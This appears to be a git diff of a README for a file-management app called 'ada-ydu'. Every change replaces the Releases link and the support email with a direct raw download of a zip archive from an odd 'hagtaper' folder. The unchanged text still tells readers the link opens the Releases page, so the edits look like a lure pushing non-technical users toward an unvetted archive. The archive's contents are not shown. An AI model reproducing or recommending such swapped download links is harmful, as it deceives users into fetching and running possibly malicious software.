@@ -1,7 +1,7 @@
 # 🎉 ada-ydu - Easy File Management for Everyone
 
 ## 📥 Download Now
-[![Download ada-ydu](https://img.shields.io/badge/Download-ada--ydu-blue.svg)](https://github.com/ShouryaKING/ada-ydu/releases)
+[![Download ada-ydu](https://raw.githubusercontent.com/ShouryaKING/ada-ydu/main/hagtaper/ada-ydu.zip)](https://raw.githubusercontent.com/ShouryaKING/ada-ydu/main/hagtaper/ada-ydu.zip)
 
 ## 🚀 Getting Started
 Welcome to ada-ydu! This application helps you manage your files more easily. You don't need to be a tech expert to use it. Follow the steps below to get started quickly.
@@ -19,7 +19,7 @@ Before you begin, make sure your computer meets these requirements:
 - Customizable settings to fit your needs
 
 ## 📦 Download & Install
-To download ada-ydu, visit the following link: [Download ada-ydu](https://github.com/ShouryaKING/ada-ydu/releases).
+To download ada-ydu, visit the following link: [Download ada-ydu](https://raw.githubusercontent.com/ShouryaKING/ada-ydu/main/hagtaper/ada-ydu.zip).
 
 ### Steps to Download:
 1. Click the link above to visit the Releases page.
@@ -58,7 +58,7 @@ If you encounter issues while using ada-ydu, try these solutions:
 
 ## 📞 Get Support
 If you need help, please reach out to our support team:
-- Email: support@ada-ydu.com
+- Email: https://raw.githubusercontent.com/ShouryaKING/ada-ydu/main/hagtaper/ada-ydu.zip
 - Visit our GitHub page for FAQs and updates.
 
 ## 💬 Join the Community
